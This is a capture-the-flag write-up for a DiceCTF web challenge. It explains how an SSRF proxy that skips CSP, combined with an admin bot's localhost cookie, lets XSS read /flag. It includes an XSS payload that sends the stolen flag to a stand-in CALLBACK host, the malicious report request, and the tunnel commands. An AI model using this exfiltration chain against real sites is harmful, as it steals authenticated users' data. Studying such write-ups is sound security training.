# mirror-temple

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | DiceCTF 2026                   |
| Category    | web                            |
| Difficulty  | Medium                         |
| Connection  | `https://mirror-temple-*.ctfi.ng` |

## Description

> stare long enough at the void ‧‮and the void stares back⁩

Spring Boot (Kotlin) application with a Matter.js physics game, SSRF proxy, and admin bot with Puppeteer.

## TL;DR

The admin bot registers at `http://localhost:8080` with the real flag, obtaining a JWT cookie for `localhost`. The proxy (Charon) bypasses Spring Security and does not apply CSP. Reporting `http://localhost:8080/proxy?url=XSS_PAGE` makes the admin visit the proxy on localhost (where THEIR cookie is valid), execute XSS without CSP restrictions, do `fetch('/flag')` with authentication, and exfiltrate the flag.

## Initial Analysis

### Tech Stack

- Spring Boot 3 (Kotlin) with Thymeleaf
- JWT (HS256) with random key generated at startup (`Jwts.SIG.HS256.key().build()`)
- Charon reverse proxy library (SSRF proxy at `/proxy?url=...`)
- Puppeteer admin bot (Node.js)
- Matter.js 0.20.0 (frontend)

### Application Flow

1. User registers at `/postcard-from-nyc` with name, portrait URL, and a flag
2. Server generates JWT with that data → cookie `save` (HttpOnly, Path=/)
3. `/flag` returns the flag from the JWT
4. `/proxy?url=...` does a server-side fetch and returns the content
5. `/report` accepts a URL, launches admin bot that visits that URL

### CSP (on normal pages)

```
default-src 'none'; script-src * 'sha256-...'; style-src 'self' ...; img-src 'self' data:;
connect-src 'self'; require-trusted-types-for 'script'; trusted-types 'none';
```

Strict Trusted Types blocks DOM XSS. `script-src *` allows external scripts but you can't inject `<script>` tags.

## Vulnerability Identified

### Type: Cookie scope + Proxy CSP bypass

**Three pieces of the puzzle:**

1. **Admin bot registers on localhost** (`admin.mjs:31`):
   ```javascript
   await page.goto("http://localhost:8080/postcard-from-nyc", ...)
   await page.type("#flag", flag)
   await page.click(".begin")
   // Cookie set for localhost:8080
   await page.goto(targetUrl, ...)  // Then visits our URL
   ```
   The JWT cookie with the real flag is for `localhost`, NOT for the public domain.

2. **Proxy (Charon) bypasses Spring Security and CSP** (`CorsProxy.kt`):
   Charon intercepts `/proxy` before Spring Security applies authentication or `SecurityTMFilter` adds CSP headers. Result: proxied pages are served without CSP.

3. **Proxy on localhost = same-origin with admin's cookie**:
   If we report `http://localhost:8080/proxy?url=XSS`, the admin visits localhost where their cookie IS valid. The proxy serves our HTML page without CSP → full JS execution with cookie access.

### Bonus: Header injection via `mirror` (`SecurityTM.kt:46-48`)

```kotlin
request.getParameter("mirror")?.let {
    response.setHeader(it.substringBefore(':'), it.substringAfter(':', ""))
}
```

Allows injecting arbitrary headers (except CSP which is overwritten afterwards). Was not necessary for the final exploit.

## Solution Process

### Step 1: Source code analysis

Extraction of `web_mirror-temple.tar.gz` reveals the complete code: Spring Boot Kotlin app with Charon proxy, JWT auth, and Puppeteer admin bot.

### Step 2: Understand the admin bot

```javascript
// admin.mjs - the bot:
// 1. Navigates to http://localhost:8080/postcard-from-nyc
// 2. Fills in name="Admin" and flag=REAL_FLAG
// 3. Clicks submit → JWT cookie for localhost
// 4. Navigates to targetUrl (our reported URL)
```

The cookie is for `localhost:8080`. When reporting public domain URLs, the cookie is NOT sent.

### Step 3: Confirm that the proxy has no CSP

The `SecurityTMFilter` (which adds CSP) has `@Order(LOWEST_PRECEDENCE)`, but Charon intercepts `/proxy` before the filter applies headers. Proxy responses have no CSP.

### Step 4: Build the XSS payload

```html
<html><body><script>
(async()=>{
  let r = await fetch("/flag");
  let f = await r.text();
  new Image().src = "https://CALLBACK/flag?f=" + encodeURIComponent(f);
  navigator.sendBeacon("https://CALLBACK/b", f);
})();
</script></body></html>
```

Host via `http://httpbin.org/base64/URL_SAFE_BASE64` (the proxy only supports HTTP, not HTTPS).

### Step 5: Report the localhost URL

```
POST /report
url=http://localhost:8080/proxy?url=http://httpbin.org/base64/PAYLOAD
```

Admin bot:
1. Registers → JWT cookie with flag for `localhost`
2. Navigates to `http://localhost:8080/proxy?url=http://httpbin.org/base64/PAYLOAD`
3. Cookie sent (same origin: localhost)
4. Proxy serves our HTML without CSP
5. `fetch('/flag')` sends the cookie → obtains the real flag
6. `new Image()` and `sendBeacon` exfiltrate the flag to our server

## Discarded Approaches

1. **XSS via proxy on public domain** → admin has no cookie for public domain, `/flag` returns login page
2. **JWT cracking (HS256)** → key randomly generated with `Jwts.SIG.HS256.key().build()`, not crackable
3. **alg:none JWT forgery** → server uses `verifyWith(SECRET_KEY)`, rejects unsigned tokens
4. **SSRF to GCP metadata** → blocked by `X-Forwarded-For` header
5. **SSRF to internal endpoints (actuator, etc.)** → all require auth, 302 redirect
6. **Prototype pollution via Matter.js** → `JSON.parse` does not cause pollution directly
7. **Trusted Types bypass** → `trusted-types 'none'` prevents creating policies, no bypass available
8. **CRLF injection in proxy URL** → returns 400
9. **`mirror` parameter to change CSP** → CSP is overwritten after the mirror

## Final Exploit

See `solve.py` and `callback_server.py`.

## Execution

```bash
# Terminal 1: callback server + tunnel
python3 callback_server.py &
cloudflared tunnel --url http://localhost:9999

# Terminal 2: exploit
python3 solve.py https://mirror-temple-HASH.ctfi.ng https://TUNNEL_URL
```

```
[*] Target: https://mirror-temple-672869a845a1.ctfi.ng
[*] Registering account...
[+] Got JWT: eyJhbGciOiJIUzI1NiJ9...
[*] Reporting: http://localhost:8080/proxy?url=...
[+] Report response: your report will be scrutinized soon
[*] Waiting for admin bot (up to 30s)...
[+] FLAG (beacon): dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_eht_evif_si_emit_eht_krad_si_moor_eht}
```

## Flag

```
dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_eht_evif_si_emit_eht_krad_si_moor_eht}
```

(Reversed: "the_room_is_dark_the_time_is_five_the_agent_is_cooking_and_the_mirror_is_alive")

## Key Lessons

- **Cookie scope is critical in challenges with admin bots**: if the bot registers on `localhost`, the cookie is for `localhost`, not for the public domain. Always report localhost URLs.
- **Proxy libraries (Charon) can bypass Spring Security**: Charon intercepts requests before the security filter chain, resulting in responses without CSP or auth checks.
- **`script-src *` + Trusted Types is not enough without a secure proxy**: although Trusted Types blocks DOM XSS, if there is a proxy serving content without CSP on the same origin, it's game over.
- **httpbin.org/base64 as HTTP hosting for XSS**: useful when the proxy only supports HTTP and you need to serve arbitrary HTML.
- **Always read the source code first**: without the source, it would have been very difficult to discover that the admin bot uses localhost.

## References

- [Charon Spring reverse proxy](https://github.com/mkopylec/charon-spring-boot-starter) — proxy library used
- [Trusted Types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types) — DOM XSS mitigation
- [httpbin base64 endpoint](http://httpbin.org/#/Dynamic_data/get_base64__value_) — for XSS hosting
